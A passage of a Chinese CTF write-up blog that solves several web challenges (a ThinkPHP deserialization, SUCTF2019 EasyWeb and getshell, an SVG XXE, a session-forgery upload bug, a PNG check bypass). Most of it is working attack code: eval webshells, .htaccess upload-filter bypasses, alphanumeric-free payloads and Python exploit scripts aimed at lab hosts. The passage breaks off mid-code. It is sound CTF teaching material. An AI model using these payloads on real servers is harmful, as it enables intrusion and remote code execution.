class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一个if可以直接pass，第二个if语句如果我们不上传文件也可以直接通过，第三个if直接赋值绕过，然后可以构造图片马绕过<code>getimagesize</code>的判断，控制<code>$this-&gt;filename</code>为php后缀形式，这样利用<code>copy($this-&gt;filename_tmp, $this-&gt;filename)</code>就可以复制出了一个 php webshell 了。</p><p>构造payload的exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$checker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/00bf23e130fa1e525e332ff03dae345d.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/shell.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure><p>得到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2FkZWVlMGMxNzBhZDRmZmIxMTBkZjBjZGUyOTRhZWNkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvYWRlZWUwYzE3MGFkNGZmYjExMGRmMGNkZTI5NGFlY2Qvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30&#x3D;</span><br></pre></td></tr></table></figure><p>填到cookie中，刷新页面</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724175540.png" alt=""></p><p>蚁剑连接拿flag。</p><h2 id="SUCTF2019-EasyWeb">SUCTF2019 EasyWeb</h2><h3 id="考点-v6">考点</h3><ul><li>无字母数字webshell</li><li>文件上传</li><li>.htaccess利用</li></ul><h3 id="解题-v6">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和极客大挑战2019 RCE ME类似的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>可以成功显示PHPINFO的信息，注意四个点，一是PHP版本是7.2，二是题目的环境是Apache，三是限制了open_basedir，最后是disable_function。</p><p>再来看get_the_flag函数，按照题意应该是想让我们通过调用get_the_flag函数来get shell，函数中有三个限制：</p><ul><li>文件内容中不能出现<code>&lt;?</code></li><li>使用了exif_imagetype来判断是不是图片</li><li>后缀名中不允许出现ph</li></ul><p>这里的限制条件就有点像SUCTF2019 CheckIn，不同的是那道题的环境是nginx，可以通过上传<code>.user.ini</code>来绕过。那么这道题如果要通过上传<code>.htaccess</code>来绕过后缀名的限制，就需要绕过<code>exif_imagetype</code>，并且不能用GIF89a等文件头，因为这样虽然能上传成功，但<code>.htaccess</code>文件无法生效。这时有两个办法：</p><ul><li><p>在.htaccess前添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure><p><code>#</code>在<code>.htaccess</code>是注释符，所以<code>.htaccess</code>文件可以生效</p></li><li><p>在.<code>htaccess</code>前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>x00x00x8ax39x8ax39 是wbmp文件的文件头，<code>.htaccess</code>中以0x00开头的同样也是注释符，所以不会影响<code>.htaccess</code></p></li></ul><p>最后就需要绕过<code>&lt;?</code>，同样也有两个办法，不过只是编码的不同而已，一种是base64编码，一种是uft-16编码，都来了解一下。</p><p>先来看utf-16的编码方式，这是<code>.htaccess</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .cc         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure><p>可以绕过的原因借用一下<a href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">tr1ple师傅的图</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707153040.png" alt=""></p><p>也就是说原来是utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符，那么明显可以绕过内容的过滤，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = open(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .cc\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">&quot;shell.cc&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传两个文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8bf8acd4-49c6-40c6-9bfe-688945f733ac.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">htaccess_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">shell_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;shell.cc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=htaccess_files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=shell_files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>验证一下</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163111.png" alt=""></p><p>用蚁剑连接，加载绕过<a href="https://github.com/Medicean/as_bypass_php_disable_functions">disable_function的插件</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163432.png" alt=""></p><p>第二种是用base64编码绕过</p><p>htaccess文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application&#x2F;x-httpd-php .cc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.cc&quot;</span><br></pre></td></tr></table></figure><p>shell的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12 &#x2F;&#x2F; 12为了满足base64算法凑足八个字节</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pPz4&#x3D;  &#x2F;&#x2F;&lt;?php @eval($_POST[cmd])?&gt;的base64编码</span><br></pre></td></tr></table></figure><h3 id="拓展">拓展</h3><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">.htaccess trick总结</a></p><p><a href="https://dy.163.com/article/ECQSCP9E0511CJ6O.html">PHP7绕过open_basedir</a></p><h2 id="BSidesCF2019-SVGMagic">BSidesCF2019 SVGMagic</h2><h3 id="考点-v7">考点</h3><ul><li><p>SVG文件格式</p></li><li><p>XXE读取文件</p></li></ul><h3 id="解题-v7">解题</h3><p>先来看看什么是SVG。</p><p>SVG 意为可缩放矢量图形（Scalable Vector Graphics）， <strong>使用 XML 格式定义图像</strong>。</p><p>看一个实例</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205345.png" alt=""></p><p>用常规的XXE文件读取payload</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205431.png" alt=""></p><p>这个地方有个坑就是flag的文件位置在当前目录，<strong>而<code>proc/self/cwd</code>就代表当前路径。</strong></p><h2 id="HFCTF2020-BabyUpload">HFCTF2020 BabyUpload</h2><h3 id="考点-v8">考点</h3><ul><li><p>代码审计</p></li><li><p>session伪造</p></li></ul><h3 id="解题-v8">解题</h3><p>审计源码可以发现这几个点</p><ul><li>session中存储了身份信息，默认事guest</li><li>通过参数可以上传文件和下载文件</li></ul><p>既然这样，那我们就先把session文件下载下来看看是什么样子的。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819190549.png" alt=""></p><p>应该是用php_binary方式序列化的session。</p><p>那么现在的思路就是：</p><p>伪造admin session --&gt; 上传新的sess文件 --&gt; 将cookie改成sess文件sha256加密后的字符串</p><p>但是现在还有一个问题就是如果绕过对success.txt的判断。</p><p>由于文件名不可控，我们就无法上传一个名为success.txt的文件，但是file_exists函数的作用的是<strong>检查文件或目录是否存在</strong>，所以我们用attr创建一个名为success.txt的目录就可以过这个判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://0abaf9de-86a1-4b6e-ab78-f008f607f2d5.node3.buuoj.cn&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, BytesIO(<span class="string">b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;download&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, data=data, files=files)</span><br><span class="line">    session_id = hashlib.sha256(<span class="string">&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> session_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_success</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;success.txt&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;test&quot;</span>, BytesIO(<span class="string">b&#x27;good job!&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_success()</span><br><span class="line">php_session_id = admin()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: php_session_id</span><br><span class="line">&#125;</span><br><span class="line">s = requests.get(url)</span><br><span class="line">r = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-Avatar-Uploader-1">HarekazeCTF2019 Avatar Uploader 1</h2><h3 id="考点-v9">考点</h3><ul><li>finfo_file函数和getimagesize函数的区别</li></ul><h3 id="解题-v9">解题</h3><p>原题是给了源码。</p><p>关键代码是在upload.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">&#x27;image/png&#x27;</span>])) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded file is not PNG format.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded image is too large.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="string">&#x27;FLAG1&#x27;</span>) . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们得了解PHP文件头格式是什么样的</p><p><a href="https://blog.csdn.net/u013943420/article/details/76855416">https://blog.csdn.net/u013943420/article/details/76855416</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113331.png" alt=""></p><p><code>89 50 4E 47 0D 0A 1A 0A</code> 是PNG头部署名域，表示这是一个PNG图片<br><code>00 00 00 0D</code> 描述IHDR头部的大小<br><code>49 48 44 52</code> 是Chunk Type Code, 这里Chunk Type Code=IHDR</p><p>接下来需要了解finfo_file函数和getimagesize函数的区别就在于：<code>FILEINFO</code> 可以识别 png 图片( 十六进制下 )的第一行，而 <code>getimagesize</code> 不可以。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113733.png" alt=""></p><h2 id="SUCTF-2019-getshell">SUCTF 2019 getshell</h2><h3 id="考点-v10">考点</h3><ul><li>无数字字母webshell</li></ul><h3 id="解题-v10">解题</h3><p>可用字符：<code>$().;=[]_~</code></p><p>取反绕过，webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=~(瞎);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(隙);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(卸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(勋);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(校);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(下);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(纤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(嫌);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure><p>flag在env环境变量中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916134726.png" alt=""></p><h2 id="SUCTF-2019-Upload-Labs-2">SUCTF 2019 Upload Labs 2</h2><h3 id="考点-v11">考点</h3><h3 id="解题-v11">解题</h3><p>admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> 